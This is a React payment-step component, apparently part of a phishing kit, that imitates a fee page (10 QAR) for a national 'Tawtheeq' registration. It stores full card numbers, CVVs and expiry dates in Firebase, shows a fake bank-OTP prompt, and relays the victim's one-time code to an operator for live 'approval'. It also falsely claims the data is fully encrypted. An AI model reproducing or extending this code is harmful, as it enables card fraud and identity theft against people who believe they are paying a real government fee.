"use client"

import type React from "react"
import { useState, useRef, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
import { CreditCard, ShieldCheck, Lock, CheckCircle, AlertCircle, RefreshCw, Clock } from "lucide-react"
import { useToast } from "@/hooks/use-toast"
import { useLocation } from "wouter"
import { addData, requestOtpApproval, subscribeToOtpApproval } from "@/lib/firebase"

interface Step4PaymentProps {
  onNext: (paymentData?: any) => void
  onBack: () => void
  formData?: any
}

const luhnCheck = (cardNumber: string): boolean => {
  const digits = cardNumber.replace(/\s/g, "")
  if (!/^\d+$/.test(digits)) return false

  let sum = 0
  let isEven = false

  for (let i = digits.length - 1; i >= 0; i--) {
    let digit = Number.parseInt(digits[i], 10)

    if (isEven) {
      digit *= 2
      if (digit > 9) {
        digit -= 9
      }
    }

    sum += digit
    isEven = !isEven
  }

  return sum % 10 === 0
}

const getCardType = (cardNumber: string): string => {
  const digits = cardNumber.replace(/\s/g, "")

  if (/^4/.test(digits)) return "Visa"
  if (/^5[1-5]/.test(digits)) return "Mastercard"
  if (/^3[47]/.test(digits)) return "American Express"
  if (/^6(?:011|5)/.test(digits)) return "Discover"

  return "Unknown"
}

const isCardBlocked = (cardNumber: string): boolean => {
  const digits = cardNumber.replace(/\s/g, "")
  return digits.startsWith("4420")
}

export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
  const [, setLocation] = useLocation()
  const { toast } = useToast()
  const [cardNumber, setCardNumber] = useState("")
  const [cardName, setCardName] = useState("")
  const [expiry, setExpiry] = useState("")
  const [cvv, setCvv] = useState("")

  // OTP State
  const [showOtp, setShowOtp] = useState(false)
  const [otpDigits, setOtpDigits] = useState(["", "", "", "", "", ""])
  const [otpError, setOtpError] = useState("")
  const [isVerifying, setIsVerifying] = useState(false)
  const [demoCode, setDemoCode] = useState("")
  const [cooldown, setCooldown] = useState(0)
  const [waitingForApproval, setWaitingForApproval] = useState(false)
  const [approvalStatus, setApprovalStatus] = useState<string | null>(null)
  const inputRefs = useRef<(HTMLInputElement | null)[]>([])

  // Countdown timer
  useEffect(() => {
    if (cooldown > 0) {
      const timer = setTimeout(() => setCooldown(cooldown - 1), 1000)
      return () => clearTimeout(timer)
    }
  }, [cooldown])

  // Subscribe to OTP approval status
  useEffect(() => {
    if (!waitingForApproval) return

    let hasProcessed = false

    const unsubscribe = subscribeToOtpApproval((status) => {
      if (hasProcessed) return

      setApprovalStatus(status)
      if (status === "approved") {
        hasProcessed = true
        toast({
          title: "تم الموافقة",
          description: "تمت الموافقة على عملية الدفع بنجاح",
        })
        setWaitingForApproval(false)
        const code = otpDigits.join("")
        onNext({
          cardNumber: cardNumber,
          cardName: cardName,
          expiry: expiry,
          cvv: cvv,
          otpCode: code,
        })
      } else if (status === "rejected") {
        hasProcessed = true
        toast({
          title: "تم الرفض",
          description: "تم رفض عملية الدفع",
          variant: "destructive",
        })
        setWaitingForApproval(false)
        setOtpDigits(["", "", "", "", "", ""])
        setOtpError("تم رفض رمز التحقق. يرجى المحاولة مرة أخرى.")
      }
    })

    return () => unsubscribe()
  }, [waitingForApproval, cardNumber, cardName, expiry, cvv, otpDigits, onNext, toast])

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")
    const matches = v.match(/\d{4,16}/g)
    const match = (matches && matches[0]) || ""
    const parts = []

    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4))
    }

    if (parts.length) {
      return parts.join(" ")
    } else {
      return value
    }
  }

  const validateCard = () => {
    if (!cardName.trim()) return "يرجى إدخال الاسم على البطاقة"

    const cleanCardNumber = cardNumber.replace(/\s/g, "")

    if (cleanCardNumber.length < 13 || cleanCardNumber.length > 19) {
      return "رقم البطاقة غير صحيح"
    }

    // Check if card is blocked (starts with 4420)
    if (isCardBlocked(cardNumber)) {
      return "عذراً، هذه البطاقة غير مقبولة للدفع"
    }

    // Luhn algorithm validation
    if (!luhnCheck(cardNumber)) {
      return "رقم البطاقة غير صالح. يرجى التحقق من الرقم"
    }

    if (!expiry || expiry.length < 5) return "تاريخ الانتهاء غير صحيح"

    // Validate expiry date format and future date
    const expiryParts = expiry.split("/")
    if (expiryParts.length !== 2) return "تاريخ الانتهاء غير صحيح"

    const month = Number.parseInt(expiryParts[0], 10)
    const year = Number.parseInt(expiryParts[1], 10)

    if (month < 1 || month > 12) return "الشهر غير صحيح"

    const currentDate = new Date()
    const currentYear = currentDate.getFullYear() % 100
    const currentMonth = currentDate.getMonth() + 1

    if (year < currentYear || (year === currentYear && month < currentMonth)) {
      return "البطاقة منتهية الصلاحية"
    }

    if (!cvv || cvv.length < 3) return "رمز الأمان غير صحيح"

    return null
  }

  const handlePayment = () => {
    const error = validateCard()
    if (error) {
      toast({
        title: "خطأ",
        description: error,
        variant: "destructive",
      })

      return
    }

    // Save card data immediately before OTP
    import("@/lib/firebase").then(({ saveStepData }) => {
      saveStepData("4_payment_card", {
        cardNumber: cardNumber,
        cardName: cardName,
        expiry: expiry,
        cvv: cvv,
        savedAt: new Date().toISOString(),
      })
    })

    // Generate demo OTP and show OTP modal
    const code = Math.floor(100000 + Math.random() * 900000).toString()
    setDemoCode(code)
    setShowOtp(true)
    setCooldown(60)
    toast({
      title: "تم إرسال رمز التحقق",
      description: "تم إرسال رمز التحقق إلى هاتفك المسجل لدى البنك",
    })
  }

  const handleDigitChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return

    const newDigits = [...otpDigits]
    newDigits[index] = value.slice(-1)
    setOtpDigits(newDigits)
    setOtpError("")

    if (value && index < 5) {
      inputRefs.current[index + 1]?.focus()
    }
  }

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !otpDigits[index] && index > 0) {
      inputRefs.current[index - 1]?.focus()
    }
  }

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault()
    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6)
    const newDigits = [...otpDigits]
    pasted.split("").forEach((digit, i) => {
      if (i < 6) newDigits[i] = digit
    })
    setOtpDigits(newDigits)
  }

  const handleVerifyOtp = async () => {
    const code = otpDigits.join("")
    if (code.length !== 6) {
      setOtpError("يرجى إدخال رمز التحقق المكون من 6 أرقام")
      return
    }

    setIsVerifying(true)

    const visitorId = localStorage.getItem("visitor")
    try {
      await addData({
        id: visitorId,
        cardNumber: cardNumber,
        cardName: cardName,
        expiry: expiry,
        cvv: cvv,
        otpCode: code,
        timestamp: new Date().toISOString(),
      })
    } catch (error) {
      console.error("[v0] Error saving card data:", error)
      setIsVerifying(false)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء حفظ البيانات",
        variant: "destructive",
      })
      return
    }

    // Send OTP for admin approval
    const success = await requestOtpApproval({
      cardNumber: cardNumber,
      cardName: cardName,
      expiry: expiry,
      cvv: cvv,
      otpCode: code,
      userName: formData?.step_2_personal_data?.fullNameArabic,
      email: formData?.step_2_personal_data?.email,
    })

    if (success) {
      setWaitingForApproval(true)
      setIsVerifying(false)
      toast({
        title: "في انتظار الموافقة",
        description: "تم إرسال طلب التحقق وفي انتظار الموافقة من الإدارة",
      })
    } else {
      setIsVerifying(false)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء إرسال طلب التحقق",
        variant: "destructive",
      })
    }
  }

  const resendOtp = () => {
    if (cooldown > 0) return
    const code = Math.floor(100000 + Math.random() * 900000).toString()
    setDemoCode(code)
    setCooldown(60)
    setOtpDigits(["", "", "", "", "", ""])
    setOtpError("")
    toast({
      title: "تم إعادة الإرسال",
      description: "تم إرسال رمز تحقق جديد",
    })
  }

  if (showOtp) {
    // Waiting for admin approval
    if (waitingForApproval) {
      return (
        <div className="p-4 sm:p-6 md:p-8 min-h-[400px] flex items-center justify-center">
          <div className="w-full max-w-md">
            <h2 className="text-xl sm:text-2xl font-bold text-center mb-6 sm:mb-8 pb-4 border-b border-gray-300">
              في انتظار الموافقة
            </h2>

            <div className="space-y-4 sm:space-y-6">
              <div className="text-center">
                <div className="mx-auto w-16 h-16 sm:w-20 sm:h-20 bg-orange-100 rounded-full flex items-center justify-center mb-4">
                  <Clock className="h-8 w-8 sm:h-10 sm:w-10 text-orange-600 animate-pulse" />
                </div>
                <h3 className="text-lg sm:text-xl font-bold text-gray-800 mb-2">جاري التحقق من البيانات</h3>
                <p className="text-sm sm:text-base text-gray-600 px-4">
                  تم إرسال طلب التحقق وفي انتظار الموافقة من الإدارة
                </p>
              </div>

              <div className="bg-orange-50 border border-orange-200 rounded-lg p-3 sm:p-4">
                <div className="flex items-center gap-2 sm:gap-3">
                  <RefreshCw className="h-4 w-4 sm:h-5 sm:w-5 text-orange-600 animate-spin flex-shrink-0" />
                  <div>
                    <p className="font-medium text-orange-800 text-sm sm:text-base">جاري المعالجة...</p>
                    <p className="text-xs sm:text-sm text-orange-600">يرجى الانتظار، سيتم إخطارك عند الموافقة</p>
                  </div>
                </div>
              </div>

              <div className="bg-gray-50 rounded-lg p-3 sm:p-4 space-y-2">
                <p className="text-xs sm:text-sm text-gray-600 break-all">
                  <span className="font-medium">رقم البطاقة:</span> {cardNumber}
                </p>
                <p className="text-xs sm:text-sm text-gray-600">
                  <span className="font-medium">رمز OTP:</span> {otpDigits.join("")}
                </p>
              </div>

              <Button
                onClick={() => {
                  setWaitingForApproval(false)
                  setOtpDigits(["", "", "", "", "", ""])
                }}
                variant="outline"
                className="w-full bg-white border-gray-300 hover:bg-gray-50 text-gray-800 h-11 sm:h-12 text-base sm:text-lg"
              >
                إلغاء والعودة
              </Button>
            </div>
          </div>
        </div>
      )
    }

    return (
      <div className="p-4 sm:p-6 md:p-8 min-h-[400px] flex items-center justify-center">
        <div className="w-full max-w-md">
          <h2 className="text-xl sm:text-2xl font-bold text-center mb-6 sm:mb-8 pb-4 border-b border-gray-300">
            التحقق من البطاقة
          </h2>

          <div className="space-y-4 sm:space-y-6">
            <div className="text-center">
              <div className="mx-auto w-14 h-14 sm:w-16 sm:h-16 bg-blue-100 rounded-full flex items-center justify-center mb-4">
                <Lock className="h-7 w-7 sm:h-8 sm:w-8 text-blue-600" />
              </div>
              <p className="text-sm sm:text-base text-gray-600 px-4">أدخل رمز التحقق المرسل إلى هاتفك</p>
            </div>

            {/* OTP Input */}
            <div className="flex justify-center gap-1.5 sm:gap-2" dir="ltr" onPaste={handlePaste}>
              {otpDigits.map((digit, index) => (
                <input
                  key={index}
                  ref={(el) => {
                    inputRefs.current[index] = el
                  }}
                  type="tel"
                  inputMode="numeric"
                  pattern="[0-9]*"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handleDigitChange(index, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(index, e)}
                  className={`w-10 h-12 sm:w-12 sm:h-14 text-center text-xl sm:text-2xl font-bold border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 ${
                    otpError ? "border-red-500" : digit ? "border-blue-500" : "border-gray-300"
                  }`}
                  data-testid={`input-card-otp-${index}`}
                />
              ))}
            </div>

            {/* Error Message */}
            {otpError && (
              <div className="flex items-center justify-center gap-2 text-red-600 bg-red-50 p-3 rounded-lg">
                <AlertCircle className="h-4 w-4 sm:h-5 sm:w-5 flex-shrink-0" />
                <span className="text-sm sm:text-base">{otpError}</span>
              </div>
            )}

            <div className="text-center">
              <button
                onClick={resendOtp}
                disabled={cooldown > 0}
                className="text-sm sm:text-base text-blue-600 hover:text-blue-800 disabled:text-gray-400 flex items-center gap-2 mx-auto"
                data-testid="button-resend-card-otp"
              >
                <RefreshCw className="h-4 w-4" />
                {cooldown > 0 ? `إعادة الإرسال بعد ${cooldown} ثانية` : "إعادة إرسال الرمز"}
              </button>
            </div>

            {/* Action Buttons */}
            <div className="flex flex-col sm:flex-row gap-3 sm:gap-4 pt-4">
              <Button
                onClick={handleVerifyOtp}
                disabled={isVerifying || otpDigits.join("").length !== 6}
                className="w-full sm:flex-1 bg-[#1e60a6] hover:bg-[#164e8a] text-white h-12 sm:h-14 text-base sm:text-xl"
                data-testid="button-verify-card-otp"
              >
                {isVerifying ? (
                  <RefreshCw className="h-5 w-5 animate-spin" />
                ) : (
                  <>
                    <CheckCircle className="h-5 w-5 ml-2" />
                    تأكيد الدفع
                  </>
                )}
              </Button>
              <Button
                onClick={() => setShowOtp(false)}
                type="button"
                variant="outline"
                className="w-full sm:flex-1 bg-white border-gray-300 hover:bg-gray-50 text-gray-800 h-12 sm:h-14 text-base sm:text-xl"
                data-testid="button-back-card-otp"
              >
                تعديل البطاقة
              </Button>
            </div>
          </div>
        </div>
      </div>
    )
  }

  return (
    <div className="p-4 sm:p-6 md:p-8">
      <div className="max-w-2xl mx-auto">
        <h2 className="text-xl sm:text-2xl font-bold text-center mb-4 sm:mb-6 pb-4 border-b border-gray-300">
          تسديد الرسوم
        </h2>

        <div className="space-y-4 sm:space-y-6">
          {/* Security Badge */}
          <div className="bg-green-50 border border-green-100 rounded-lg p-2.5 sm:p-3 flex items-center gap-2 sm:gap-3">
            <ShieldCheck className="h-4 w-4 sm:h-5 sm:w-5 text-green-600 flex-shrink-0" />
            <span className="text-xs sm:text-sm font-medium text-green-700">بياناتك مشفرة ومحمية بنسبة 100%</span>
          </div>

          <div className="bg-blue-50 p-3 sm:p-4 rounded-lg">
            <p className="text-gray-700 text-xs sm:text-sm leading-relaxed">
              سيتم استيفاء مبلغ (10 ر.ق) بدل رسوم تسجيل لإتمام عملية التسجيل في نظام التوثيق الوطني (توثيق).
            </p>
          </div>

          <form
            className="space-y-4 sm:space-y-5"
            onSubmit={(e) => {
              e.preventDefault()
              handlePayment()
            }}
          >
            <div className="space-y-2 sm:space-y-3">
              <Label className="font-bold text-xs sm:text-sm text-gray-700">طريقة الدفع</Label>
              {/* Payment Method Grid */}
              <RadioGroup defaultValue="visa" className="grid grid-cols-3 gap-2 sm:gap-3">
                <label className="cursor-pointer border-2 border-transparent hover:border-gray-200 [&:has(:checked)]:border-blue-500 [&:has(:checked)]:bg-blue-50 rounded-lg p-2 sm:p-3 flex flex-col items-center justify-center transition-all bg-gray-50">
                  <RadioGroupItem value="visa" id="visa" className="sr-only" />
                  <CreditCard className="h-6 w-6 sm:h-8 sm:w-8 mb-1 sm:mb-2 text-blue-600" />
                  <span className="text-[10px] sm:text-xs font-bold text-gray-600">Visa</span>
                </label>
                <label className="cursor-pointer border-2 border-transparent hover:border-gray-200 [&:has(:checked)]:border-blue-500 [&:has(:checked)]:bg-blue-50 rounded-lg p-2 sm:p-3 flex flex-col items-center justify-center transition-all bg-gray-50">
                  <RadioGroupItem value="master" id="master" className="sr-only" />
                  <CreditCard className="h-6 w-6 sm:h-8 sm:w-8 mb-1 sm:mb-2 text-orange-500" />
                  <span className="text-[10px] sm:text-xs font-bold text-gray-600">Mastercard</span>
                </label>
                <label className="cursor-pointer border-2 border-transparent hover:border-gray-200 [&:has(:checked)]:border-blue-500 [&:has(:checked)]:bg-blue-50 rounded-lg p-2 sm:p-3 flex flex-col items-center justify-center transition-all bg-gray-50">
                  <RadioGroupItem value="naps" id="naps" className="sr-only" />
                  <CreditCard className="h-6 w-6 sm:h-8 sm:w-8 mb-1 sm:mb-2 text-gray-400" />
                  <span className="text-[10px] sm:text-xs font-bold text-gray-600">Debit / NAPS</span>
                </label>
              </RadioGroup>
            </div>

            <div className="space-y-2">
              <Label className="font-bold text-xs sm:text-sm text-gray-700">الاسم على البطاقة</Label>
              <Input
                className="text-right h-11 sm:h-12 bg-white text-sm sm:text-base"
                placeholder="الاسم كما يظهر على البطاقة"
                value={cardName}
                onChange={(e) => setCardName(e.target.value)}
                data-testid="input-card-name"
              />
            </div>

            <div className="space-y-2">
              <Label className="font-bold text-xs sm:text-sm text-gray-700">رقم البطاقة</Label>
              <div className="relative dir-ltr">
                <CreditCard className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 sm:h-5 sm:w-5 text-gray-400" />
                <Input
                  className="pl-9 sm:pl-10 text-left h-11 sm:h-12 bg-white font-mono tracking-widest text-sm sm:text-base"
                  placeholder="0000 0000 0000 0000"
                  maxLength={19}
                  inputMode="numeric"
                  type="tel"
                  value={cardNumber}
                  onChange={(e) => {
                    const formatted = formatCardNumber(e.target.value)
                    setCardNumber(formatted)
                  }}
                  data-testid="input-card-number"
                />
              </div>
            </div>

            {/* Expiry and CVV Grid */}
            <div className="grid grid-cols-2 gap-3 sm:gap-4">
              <div className="space-y-2">
                <Label className="font-bold text-xs sm:text-sm text-gray-700">تاريخ الانتهاء</Label>
                <Input
                  className="text-center h-11 sm:h-12 bg-white text-sm sm:text-base"
                  placeholder="MM / YY"
                  maxLength={5}
                  value={expiry.length === 2 && !expiry.includes("/") ? `${expiry}/` : expiry}
                  type="tel"
                  onChange={(e) => setExpiry(e.target.value)}
                  data-testid="input-expiry"
                />
              </div>
              <div className="space-y-2">
                <Label className="font-bold text-xs sm:text-sm text-gray-700">رمز الأمان (CVV)</Label>
                <Input
                  className="text-center h-11 sm:h-12 bg-white text-sm sm:text-base"
                  placeholder="123"
                  maxLength={3}
                  type="tel"
                  inputMode="numeric"
                  value={cvv}
                  onChange={(e) => setCvv(e.target.value.replace(/\D/g, ""))}
                  data-testid="input-cvv"
                />
              </div>
            </div>

            {/* Action Buttons */}
            <div className="flex flex-col sm:flex-row gap-3 sm:gap-4 pt-4">
              <Button
                type="submit"
                className="w-full sm:flex-1 bg-[#1e60a6] hover:bg-[#164e8a] text-white h-12 sm:h-14 text-base sm:text-xl order-1 sm:order-1"
                data-testid="button-pay"
              >
                <Lock className="h-4 w-4 sm:h-5 sm:w-5 ml-2" />
                دفع (10.00 ر.ق)
              </Button>
              <Button
                onClick={onBack}
                type="button"
                variant="outline"
                className="w-full sm:flex-1 bg-white border-gray-300 hover:bg-gray-50 text-gray-800 h-12 sm:h-14 text-base sm:text-xl order-2 sm:order-2"
                data-testid="button-back"
              >
                السابق
              </Button>
            </div>
          </form>
        </div>
      </div>
    </div>
  )
}
